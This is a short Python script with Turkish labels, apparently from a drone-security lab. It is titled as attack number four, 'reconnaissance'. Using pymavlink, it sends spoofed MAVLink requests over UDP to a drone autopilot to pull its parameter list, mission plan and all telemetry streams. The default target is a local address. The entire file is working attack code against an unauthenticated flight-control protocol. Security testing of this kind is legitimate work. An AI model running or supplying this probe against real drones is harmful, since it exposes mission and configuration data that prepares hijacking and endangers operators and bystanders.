#!/usr/bin/env python3
"""Saldiri #4 - Kesif. Dronedan parametre/gorev/veri akisi bilgisi cekmeye calisir."""
import argparse
import socket
import time

from pymavlink.dialects.v20 import common as mavlink2

RECON_SYSID = 255
RECON_COMPID = 191
TARGET_SYS = 1
TARGET_COMP = mavlink2.MAV_COMP_ID_AUTOPILOT1


class UDPSender:
    def __init__(self, host, port, sysid, compid):
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        self.sock.bind(("0.0.0.0", 0))
        self.addr = (host, int(port))
        self.mav = mavlink2.MAVLink(self, srcSystem=sysid, srcComponent=compid)

    def write(self, data):
        self.sock.sendto(data, self.addr)


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--target", default="127.0.0.1:14561")
    args = ap.parse_args()

    host, port = args.target.split(":")
    s = UDPSender(host, port, RECON_SYSID, RECON_COMPID)
    print(f"[saldiri] KESIF -> {args.target} (sysid={RECON_SYSID})")
    print("[saldiri] 1) PARAM_REQUEST_LIST")
    s.mav.param_request_list_send(TARGET_SYS, TARGET_COMP)
    time.sleep(0.3)
    print("[saldiri] 2) MISSION_REQUEST_LIST")
    s.mav.mission_request_list_send(TARGET_SYS, TARGET_COMP)
    time.sleep(0.3)
    print("[saldiri] 3) REQUEST_DATA_STREAM")
    s.mav.request_data_stream_send(TARGET_SYS, TARGET_COMP,
                                   mavlink2.MAV_DATA_STREAM_ALL, 10, 1)
    time.sleep(0.3)
    print("[saldiri] tamam. Kesif paketleri gonderildi.")


if __name__ == "__main__":
    main()